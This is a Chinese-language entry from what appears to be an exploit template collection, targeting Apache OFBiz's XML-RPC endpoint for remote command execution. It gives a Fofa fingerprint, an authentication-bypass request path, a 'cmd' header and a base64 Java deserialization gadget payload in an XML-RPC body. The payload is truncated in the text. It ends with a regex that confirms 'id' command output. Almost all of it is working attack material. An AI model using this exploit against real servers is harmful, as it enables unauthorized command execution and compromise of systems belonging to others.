# ApacheOfbizXML-RPCRCE

- **系统**：ApacheOfbizXML　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Apache_OFBiz"`
- **请求**：`POST /webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y HTTP/1.1`
- **关键头**：`cmd: id`

**请求体 / payload**
```
<?xml version="1.0"?>
<methodCall>
<methodName>RCE</methodName>
<params>
<param>
<value>
<struct>
<member>
<name>RCE</name>
<value>
<serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">   rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tL…（脚本共 8770 字，完整版见原文）
```
- **预期**：200　|　^(?=.*?uid)(?=.*?gid)(?=.*?groups).*?$